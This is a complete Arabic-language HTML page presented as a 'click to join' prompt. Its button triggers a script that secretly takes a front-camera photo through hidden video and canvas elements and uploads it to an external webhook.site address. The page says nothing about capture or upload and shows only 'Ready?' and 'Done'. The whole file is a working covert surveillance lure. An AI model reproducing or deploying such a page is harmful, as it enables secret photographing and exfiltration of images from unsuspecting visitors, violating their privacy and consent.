<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>اضغط للانضمام</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #000;
      color: #fff;
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    #status {
      font-size: 2.2rem;
      margin: 1rem;
    }
    button {
      padding: 1rem 3rem;
      font-size: 1.6rem;
      background: #006600;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:disabled {
      background: #333;
    }
  </style>
</head>
<body>

  <div id="status">جاهز؟</div>
  <button id="btn">ابدأ</button>

  <video id="video" autoplay playsinline muted style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    btn.onclick = async () => {
      btn.disabled = true;
      status.textContent = "جاري الطلب...";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // ننتظر ثانية واحدة لتثبيت الصورة
        await new Promise(r => setTimeout(r, 1000));

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);

        const blob = await new Promise(resolve => {
          canvas.toBlob(resolve, 'image/jpeg', 0.75);
        });

        const formData = new FormData();
        formData.append('image', blob, 'img.jpg');

        await fetch('https://webhook.site/88dae8aa-d964-44bb-aabb-4aa6b6760657', {
          method: 'POST',
          body: formData
        });

        status.textContent = "تم";
        // إغلاق الكاميرا
        stream.getTracks().forEach(track => track.stop());

      } catch (err) {
        status.textContent = "حدث خطأ";
        btn.disabled = false;
      }
    };
  </script>
</body>
</html>
